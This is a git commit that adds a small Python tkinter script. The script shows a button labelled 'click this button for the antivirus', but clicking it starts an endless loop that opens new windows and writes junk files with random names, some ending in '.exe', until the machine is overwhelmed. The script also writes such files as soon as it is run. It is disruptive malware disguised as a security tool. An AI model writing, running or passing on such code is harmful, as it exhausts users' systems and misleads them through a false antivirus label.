fdb114e47a797e7b74efef52092f07ca274642fd
qw3rty <73661891+qertyuiop12345678@users.noreply.github.com>
2021-03-08 18:49:36 -0500

    Create ?.py

---
+++ ?.py
@@ -0,0 +1,42 @@
+import tkinter as tk
+import time,random
+import uuid
+''''/home/runner/FunctionalCompassionatePrinter'''''
+import os,main
+
+def my_random_string(string_length=10):
+    """Returns a random string of length string_length."""
+    random = str(uuid.uuid4()) # Convert UUID format to a Python string.
+    random = random.upper() # Make all characters uppercase.
+    random = random.replace("-","") # Remove the UUID '-'.
+    return random[0:string_length] # Return the random string.
+def vat():
+            z = my_random_string()
+            o  = open(f'f{z}????.Lo9879^%$#@#$%^&*(^+''.exe''','w').write('\n')
+vat()
+print(my_random_string(6)) # For example, D9E50C
+def startInfiniteLoop():
+
+    i = 0
+    vat()
+    import main
+    otherFrame = []
+    while True:
+        vat()
+        otherFrame.append(tk.Toplevel())
+        i += 1
+        if i%1000 == 0:
+            z = my_random_string()
+            o  = open(f'f{z}','w').write('\n')
+            time.sleep(1)
+            root.update()
+            z = my_random_string()
+            o  = open(f'f{z}','w').write('\n')
+root = tk.Tk()
+button_one = tk.Button(root, text="click this button for the antivirus", command=startInfiniteLoop)
+button_one.grid(row=0, column=0)
+root.mainloop()
+def vat():
+            z = my_random_string()
+            o  = open(f'f{z}+''.exe''','w').write('\n')
+vat()
